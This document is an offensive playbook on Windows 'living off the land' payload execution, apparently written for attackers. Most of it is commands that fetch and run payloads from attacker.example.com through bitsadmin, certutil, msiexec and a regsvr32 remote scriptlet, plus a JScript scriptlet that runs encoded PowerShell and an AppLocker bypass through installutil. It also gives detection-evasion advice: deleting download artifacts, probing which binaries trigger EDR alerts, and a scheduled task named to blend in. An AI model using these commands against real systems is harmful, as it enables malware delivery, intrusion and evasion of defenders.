# LoLbin payload execution

Executing a payload using binaries already present on the target system, without
dropping additional tooling to disk.

## Assess what is available

Before selecting a LoLbin, confirm what is present and what EDR rules are applied
to it. Not all LoLbins are equal on every target.

```powershell
# check for commonly abused binaries
$targets = @('certutil', 'mshta', 'wmic', 'regsvr32', 'rundll32',
             'msiexec', 'bitsadmin', 'cmstp', 'installutil')
foreach ($t in $targets) {
    $path = Get-Command $t -ErrorAction SilentlyContinue
    if ($path) { Write-Output "$t : $($path.Source)" }
}

# check if cloud CLIs are present
Get-Command aws, az, gcloud -ErrorAction SilentlyContinue
```

Check EDR telemetry or test with a benign action first to see which binaries generate
alerts before using them for payload delivery.

## BITS download and execute

BITS (Background Intelligent Transfer Service) downloads files using HTTPS, survives
reboots, retries on failure, and is used legitimately by Windows Update. Ideal for
reliable payload staging.

```text
# download payload via BITS (no separate process, no PowerShell)
bitsadmin /transfer "WindowsUpdate" /download /priority foreground \
  https://attacker.example.com/stage2.exe C:\ProgramData\stage2.exe

# or via PowerShell BITS cmdlet (less suspicious command line)
Start-BitsTransfer -Source 'https://attacker.example.com/stage2.exe' \
                   -Destination 'C:\ProgramData\stage2.exe'

# then execute via a separate LoLbin
rundll32.exe C:\ProgramData\stage2.dll,DllMain
```

## Certutil download and decode

```text
# download a base64-encoded payload
certutil -urlcache -split -f https://attacker.example.com/payload.b64 C:\ProgramData\payload.b64

# decode it
certutil -decode C:\ProgramData\payload.b64 C:\ProgramData\payload.exe

# clean the URL cache entry to remove the download artefact
certutil -urlcache -split -f https://attacker.example.com/payload.b64 delete
```

Note: certutil URL activity is now heavily monitored by most EDR products. Use BITS
as the first preference; fall back to certutil if BITS is blocked.

## Msiexec remote install

MSI packages can include custom actions that execute arbitrary code. A malicious MSI
delivered as a "software update" installs cleanly and launches the payload.

```text
# install a remote MSI silently
msiexec /q /i https://attacker.example.com/update.msi

# or from a UNC path (if SMB access exists to a controlled share)
msiexec /q /i \\attacker.example.com\share\update.msi
```

Building the MSI:

```text
# using wix or advanced installer to wrap a payload in an MSI
# the custom action type 34 (executable) or type 1 (.NET) runs the payload
# at install time under msiexec.exe context
```

## Regsvr32 scriptlet execution

Regsvr32 fetches and registers COM objects, including remote scriptlets (.sct files).
The scriptlet can contain arbitrary JScript or VBScript:

```text
regsvr32 /s /n /u /i:https://attacker.example.com/payload.sct scrobj.dll
```

The scriptlet:

```xml
<?XML version="1.0"?>
<scriptlet>
<registration progid="ShortJSRAT" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
  var r = new ActiveXObject("WScript.Shell").Run("powershell -enc BASE64PAYLOAD", 0, false);
]]>
</script>
</registration>
</scriptlet>
```

Regsvr32 with remote SCT is widely detected. Use for environments where the specific
EDR product does not monitor it (test first).

## Executing without PowerShell

In environments where PowerShell is constrained or monitored:

```text
# cscript/wscript: execute VBScript or JScript
cscript //nologo payload.vbs
wscript payload.js

# mshta: execute HTA (HTML Application)
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami > C:\out.txt"",0,True:Close")

# installutil (.NET): bypass applocker for .NET assemblies
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /u payload.dll
```

## Chaining for lower individual signal

Instead of one suspicious action, chain several unremarkable ones:

```text
# 1. BITS download (looks like Windows Update activity)
Start-BitsTransfer -Source 'https://legitimate-looking-domain.com/update.cab' -Destination 'C:\ProgramData\update.cab'

# 2. expand the cab (built-in Windows tool)
expand C:\ProgramData\update.cab C:\ProgramData\ -F:*

# 3. schedule execution via schtasks (task name chosen to blend in)
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\Refresh" /tr "C:\ProgramData\update.dll" /sc once /st 00:00 /f
schtasks /run /tn "Microsoft\Windows\UpdateOrchestrator\Refresh"
```

Each step individually is unremarkable. The sequence achieves payload execution.
